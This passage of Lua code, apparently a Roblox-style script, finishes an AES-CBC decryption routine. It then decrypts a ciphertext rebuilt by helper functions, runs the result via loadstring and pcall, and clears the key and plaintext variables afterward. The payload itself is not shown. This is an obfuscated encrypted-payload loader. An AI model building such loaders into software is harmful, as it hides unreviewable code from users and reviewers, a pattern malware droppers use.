    assert(#key == 32, "AES-256 key must be 32 bytes")
    assert(#iv  == 16, "IV must be 16 bytes")
    assert(#cipher % 16 == 0, "Ciphertext must be a multiple of 16 bytes")
    if #cipher == 0 then error("Empty ciphertext") end

    local out = {}
    local prev = iv
    for i = 1, #cipher, 16 do
        local cblock = cipher:sub(i, i+15)
        local pblock = decryptblock(cblock, key)
        if #pblock ~= 16 then
            error(("decryptblock returned %d bytes at offset %d"):format(#pblock, i))
        end
        out[#out+1] = xor16(pblock, prev)
        prev = cblock
    end
    return pkcs7_unpad(table.concat(out))
end

local CIPHER_HEX = rebuild_cipher_hex()
local IV_HEX = rebuild_iv_hex()

-- Final decrypt + execute
local plain = AES.decrypt_cbc(
    hexToBytes(CIPHER_HEX),
    hexToBytes(AES_KEY_HEX),
    hexToBytes(IV_HEX)
)

print("=== Decrypted preview ===")
print(plain:sub(1, 200))
print("=========================")

local f, err = loadstring(plain)
if not f then
    warn("❌ Loadstring failed:", err)
else
    local ok, runtimeErr = pcall(f)
    if not ok then
        warn("❌ Runtime error:", runtimeErr)
    else
        print("✅ Script executed successfully")
    end
end

AES_KEY_HEX, IV_HEX, CIPHER_HEX, plain = nil, nil, nil, nil
